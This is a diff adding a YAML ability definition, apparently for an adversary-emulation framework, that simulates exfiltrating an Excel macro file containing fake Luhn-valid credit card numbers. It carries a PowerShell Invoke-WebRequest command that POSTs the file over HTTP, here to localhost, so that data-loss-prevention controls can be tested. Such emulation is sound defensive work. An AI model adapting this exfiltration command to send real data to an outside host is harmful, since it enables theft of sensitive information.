@@ -1,0 +1,24 @@
+---
+- id: 7b6d0accaab6330d701dea8f4d7d96d4
+  name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
+  description: 'Upon successful execution, an excel containing VBA Macro containing
+    sensitive data will be sent outside the network using HTTP.
+
+    Sensitive data includes about around 20 odd simulated credit card numbers that
+    passes the LUHN check.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1027
+    name: Obfuscated Files or Information
+  platforms:
+    windows:
+      psh:
+        command: Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body "9070cd_T1027-cc-macro.xlsm"
+        payloads:
+        - 9070cd_T1027-cc-macro.xlsm
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
